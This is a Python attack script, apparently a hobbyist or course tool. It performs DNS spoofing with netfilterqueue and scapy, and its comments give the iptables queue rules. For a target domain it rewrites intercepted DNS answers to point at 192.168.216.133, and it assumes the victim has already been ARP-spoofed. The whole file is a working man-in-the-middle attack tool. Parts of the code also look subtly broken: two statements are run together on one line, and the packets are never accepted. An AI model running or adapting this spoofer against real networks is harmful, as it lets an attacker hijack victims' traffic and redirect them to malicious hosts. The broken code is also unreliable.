#!/usr/bin/env python3

# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --policy FORWARD ACCEPT

import netfilterqueue
import signal
import sys
import scapy.all as scapy
from argparse import ArgumentParser

def ctrl_c(sig,frame):
    print("\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT,ctrl_c)

def get_args():
    parser = ArgumentParser(description="DNS Spoofer to envenenate domains. Must have ARP-Spoofed the victim previously.")
    parser.add_argument("-d","--domain", dest="domain")
    
    args = parser.parse_args()

    return args.domain

def main(domain):
    queue = netfilterqueue.NetfilterQueue()

    def process_packet(packet):
       
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname;

            if domain.encode() in qname:
                answer = scapy.DNSRR(rrname=qname, rdata='192.168.216.133')
                scapy_packet[scapy.DNS].an = answer 
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len 
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len 
                del scapy_packet[scapy.UDP].chksum
                
                packet.set_payload(scapy_packet.build())
                
    queue.bind(0, process_packet)     queue.run()

if __name__ == '__main__':
    domain = get_args()
    main(domain)
    
